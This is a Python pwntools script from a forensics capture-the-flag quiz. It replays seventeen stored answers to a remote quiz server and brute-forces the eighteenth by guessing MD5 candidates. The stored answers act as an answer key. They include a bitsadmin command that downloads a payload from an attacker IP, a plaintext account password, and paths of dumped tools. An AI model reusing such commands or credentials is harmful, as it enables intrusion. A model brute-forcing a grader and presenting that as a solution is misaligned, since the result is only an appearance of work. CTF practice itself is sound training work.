from pwn import *
import time

context.log_level = 'error'  # Reduce noise

def try_answer(answer, answers_before):
    """Try a specific answer for Q18"""
    host = 'gzcli.ctf.cyberjawara.id'
    port = 60221
    
    try:
        r = remote(host, port, timeout=10)
        
        # Answer questions 1-17
        for i, ans in enumerate(answers_before):
            r.recvuntil(b"Answer: ", timeout=10)
            r.sendline(ans.encode())
        
        # Now we're at Q18
        r.recvuntil(b"Answer: ", timeout=10)
        r.sendline(answer.encode())
        
        # Check response
        response = r.recvline(timeout=5).decode()
        r.close()
        
        if "Correct" in response:
            return True, response
        return False, response
    except Exception as e:
        return None, str(e)

# Answers for Q1-Q17
answers_before = [
    "https://cybersharing.net/api/download/file/8bd5ce87-b1d2-45a8-be68-03bc664ab068/7f203a93-4619-40f8-93c4-e075eb4d39dd/ea62a809-a93b-4a89-bfe1-33247f5058f8/AnsiArtInstaller.exe_AnsiArtInstaller.exe_12/21/2025 11:14:31 PM",
    "12/21/2025 11:15:10 PM",
    "ansi_art.exe,program.banner",
    "C:\\Users\\Administrator\\AppData\\Local\\Temp",
    "C:\\Users\\Administrator\\Desktop\\AnsiArt.lnk",
    "192.168.100.157:443",
    "http://192.168.100.157:8082",
    "C:\\h1dd3n",
    "\"C:\\Windows\\system32\\bitsadmin.exe\" /Transfer jarangoyang /priority foreground http://192.168.100.157:8082/SDelete.zip C:\\h1dd3n\\sadewa.zip",
    "ipconfig",
    "as3ng_AsengCupu123!",
    "administrators,Remote Desktop Users",
    "12/22/2025 12:02 AM",
    "C:\\h1dd3n\\mimiperi.exe",
    "C:\\h1dd3n\\sassy.exe",
    "\\85985985-ddfa-430b-bf04-fc33fcfdc881\\pipe\\epmapper",
    "C:\\h1dd3n\\kucing.exe",
]

# Load priority candidates first, then all candidates
with open('md5_priority.txt', 'r') as f:
    priority = [line.strip() for line in f if line.strip()]

with open('md5_candidates.txt', 'r') as f:
    all_candidates = [line.strip() for line in f if line.strip()]

# Combine: priority first, then rest (avoiding duplicates)
priority_set = set(priority)
candidates = priority + [c for c in all_candidates if c not in priority_set]

print(f"Loaded {len(priority)} priority + {len(candidates) - len(priority)} other = {len(candidates)} total candidates")
print("Starting brute force for Question 18...")
print("="*60)

# Try each candidate
for i, candidate in enumerate(candidates):
    if i % 100 == 0:
        print(f"Progress: {i}/{len(candidates)} ({100*i/len(candidates):.1f}%)")
    
    result, response = try_answer(candidate, answers_before)
    
    if result is True:
        print(f"\n{'='*60}")
        print(f"FOUND CORRECT ANSWER!")
        print(f"MD5: {candidate}")
        print(f"Response: {response}")
        print(f"{'='*60}")
        
        # Save the answer
        with open('q18_answer.txt', 'w') as f:
            f.write(candidate)
        break
    elif result is None:
        # Connection error, retry
        time.sleep(1)
        result, response = try_answer(candidate, answers_before)
        if result is True:
            print(f"\n{'='*60}")
            print(f"FOUND CORRECT ANSWER!")
            print(f"MD5: {candidate}")
            print(f"Response: {response}")
            print(f"{'='*60}")
            with open('q18_answer.txt', 'w') as f:
                f.write(candidate)
            break
    
    # Small delay to avoid rate limiting
    time.sleep(0.1)

else:
    print("\nNo correct answer found in candidates!")

